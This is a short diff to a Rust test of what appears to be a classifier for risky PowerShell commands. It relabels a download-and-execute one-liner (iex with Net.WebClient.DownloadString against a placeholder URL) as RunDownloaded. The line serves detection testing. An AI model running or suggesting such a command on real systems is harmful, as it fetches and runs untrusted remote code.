@@ -102,7 +102,7 @@ fn risky_powershell() {
             ),
             (
                 "iex (New-Object Net.WebClient).DownloadString('https://x')",
-                Rule::Unknown,
+                Rule::RunDownloaded,
             ),
             ("Invoke-Expression $cmd", Rule::Unknown),
             ("& $tool --force", Rule::Unknown),
